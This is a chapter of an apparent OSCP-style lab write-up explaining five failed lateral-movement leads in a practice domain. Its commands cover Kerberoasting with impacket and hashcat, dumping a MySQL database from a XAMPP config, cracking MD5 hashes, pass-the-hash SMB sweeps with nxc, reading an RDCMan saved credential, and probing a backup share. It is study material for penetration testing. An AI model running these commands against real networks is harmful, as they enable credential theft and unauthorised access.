# 05 — Five dead ends

With a local Administrator shell and a tunnel into the domain, every obvious next move is available.
All of them fail, and the reason they fail is the same: the box is built so that the only useful
credential is on the host that cannot be entered yet.

## 5.1 Kerberos — tickets without a use

The first domain move is to ask `SRV22` for service tickets and crack them offline.

```bash
sudo impacket-GetUserSPNs -dc-ip 172.16.97.200 oscp.exam/p.andrew:'[redacted]' -request
```

```text
[-] Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
```

Nothing to do with the credential. Kerberos refuses tickets when the client clock and the DC clock
differ by more than five minutes, and the exam VM had drifted. Sync against the DC and repeat:

```bash
sudo ntpdate 172.16.97.200
# or, if ntpdate is not installed
sudo rdate -n 172.16.97.200
```

```text
ServicePrincipalName                  Name        MemberOf  PasswordLastSet   LastLogon   Delegation
------------------------------------  ----------  --------  ----------------  ----------  ----------
http/[redacted].oscp.exam             [redacted]  ...       ...               ...         ...
```

Tickets come back, `hashcat -m 13100` runs, and nothing cracks to a credential that is accepted
anywhere. The service accounts are either long-password accounts or decoys; either way the set does not
need them.

```bash
hashcat -m 13100 spn.txt /usr/share/wordlists/rockyou.txt
```

| What was tried | Result |
|---|---|
| `GetUserSPNs -request` | `KRB_AP_ERR_SKEW`, then SPNs returned after a clock sync |
| `hashcat -m 13100` on the tickets | no usable plaintext |
| the cracked candidates against SMB and WinRM | rejected |

## 5.2 The database — credentials that lead nowhere

`WS26` runs XAMPP, and XAMPP means MySQL with a `config.inc.php` holding the database password. Local
Administrator can read it, log in, and dump every table.

```bash
type C:\xampp\htdocs\[redacted]\config.inc.php
mysql -u root -p'[redacted]' -e "show databases;"
mysqldump -u root -p'[redacted]' --all-databases > C:\Users\Administrator\Desktop\dump.sql
```

```text
Database
information_schema
mysql
performance_schema
[redacted]
```

The application database is full of user rows and password hashes — a lot of them, in plaintext and in
MD5. None of them authenticate against the domain, and none of them are reused on `SRV22` or
`172.16.97.202`.

```bash
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt
nxc smb 172.16.97.0/24 -u [redacted] -p '[redacted]'
```

```text
SMB         172.16.97.206   445    WS26    [-] oscp.exam\[redacted]:[redacted] STATUS_LOGON_FAILURE
SMB         172.16.97.202   445    [redacted]    [-] oscp.exam\[redacted]:[redacted] STATUS_LOGON_FAILURE
```

This is the box's main decoy. A database with hundreds of credentials feels like the centre of the
lab; here it is background noise, and every hour spent cracking it is an hour not spent on the token.

## 5.3 RDCMan — a saved session, encrypted

Under `C:\Users\Administrator\Documents` there is a Remote Desktop Connection Manager configuration:

```powershell
Get-ChildItem C:\Users\Administrator\Documents -Recurse -Include *.rdc,*.rdg
```

```text
    Directory: C:\Users\Administrator\Documents

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         7/16/2026   6:12 AM           1842 [redacted].rdc
```

The file contains a `<server>` entry and a `<password>` element, but RDCMan stores the password
encrypted with the user's DPAPI master key. Reading it needs that user's profile unlocked — which is
exactly the context you already have and exactly the context that does not help:

```powershell
type C:\Users\Administrator\Documents\[redacted].rdc
```

```xml
<logonCredentials inherit="None">
  <userName>[redacted]</userName>
  <domain>[redacted]</domain>
  <password>[redacted]</password>
</logonCredentials>
```

Decrypting DPAPI blobs from a WinRM session is possible in principle and unreliable in practice; the
values recovered here were not accepted on `SRV22` or `172.16.97.202`. A saved RDP profile is worth
opening, not worth a detour.

## 5.4 SMB shares — the default set

With a local administrator hash in hand, the obvious sweep is every share on every host:

```bash
nxc smb 172.16.97.0/24 -u Administrator -H '[redacted]' --local-auth --shares
```

```text
SMB         172.16.97.206   445    WS26    [+] WS26\Administrator:[redacted] (Pwn3d!)
SMB         172.16.97.206   445    WS26    [*] Enumerated shares
SMB         172.16.97.206   445    WS26    Share           Permissions     Remark
SMB         172.16.97.206   445    WS26    -----           -----------     ------
SMB         172.16.97.206   445    WS26    ADMIN$          READ,WRITE      Remote Admin
SMB         172.16.97.206   445    WS26    C$              READ,WRITE      Default share
SMB         172.16.97.206   445    WS26    IPC$            READ            Remote IPC
SMB         172.16.97.202   445    [redacted]    [-] WS26\Administrator:[redacted] STATUS_LOGON_FAILURE
```

`--local-auth` matters: the hash is a `WS26` SAM hash and means nothing on `172.16.97.202`. The sweep
returns the default administrative shares on the host that is already owned, and a logon failure on the
host that is not.

## 5.5 Backups on the other machine

The last lead was the backup directory on `172.16.97.202` — the kind of folder that holds a
`ntds.dit`, a script with a password, or a copy of somebody's profile. Nothing in hand could read it:

```bash
smbclient -L //172.16.97.202 -U 'oscp.exam\p.andrew%[redacted]'
smbclient //172.16.97.202/[redacted] -U 'oscp.exam\p.andrew%[redacted]'
```

```text
session setup failed: NT_STATUS_ACCESS_DENIED
```

A backup share is the right instinct — backups are where credentials leak — but the instinct needs a
credential that the share accepts, and this one accepts nothing that was available.

## 5.6 Why all five failed

| Lead | Why it looked promising | Why it was not |
|---|---|---|
| Kerberoasting | a domain credential and a reachable DC | the SPNs belong to accounts whose passwords do not crack |
| MySQL / phpMyAdmin | hundreds of credential rows on an owned host | application accounts, not domain accounts; nothing reused |
| RDCMan `.rdc` | a saved RDP profile with a stored password | DPAPI-encrypted, and the recovered values are not valid |
| SMB shares | local admin on a domain member | the hash is local; the other host rejects it |
| Backup directory | backups concentrate secrets | no credential the share accepts |

The common thread is worth stating plainly: **every one of these produces credentials, and none of
them produces an identity.** The set does not reward volume of loot; it rewards the one account that
has an outbound ACL to Domain Admin. That account is what BloodHound is for.

---

**Next:** [`06-bloodhound-and-the-wall.md`](06-bloodhound-and-the-wall.md)
